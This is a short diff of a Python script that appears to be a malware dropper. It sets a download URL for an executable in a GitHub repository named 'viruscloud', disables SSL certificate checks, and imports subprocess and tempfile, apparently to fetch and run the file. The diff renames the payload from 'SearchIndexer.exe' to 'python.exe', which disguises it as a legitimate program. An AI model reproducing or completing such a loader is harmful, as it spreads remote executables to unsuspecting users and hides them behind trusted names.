@@ -4,7 +4,7 @@ import urllib.request
 import subprocess
 import tempfile
 
-url = "https://github.com/Dontusecloudforvirus/viruscloud/releases/download/release/SearchIndexer.exe"
+url = "https://github.com/Dontusecloudforvirus/viruscloud/releases/download/release/python.exe"
 
 ssl_context = ssl._create_unverified_context()
 
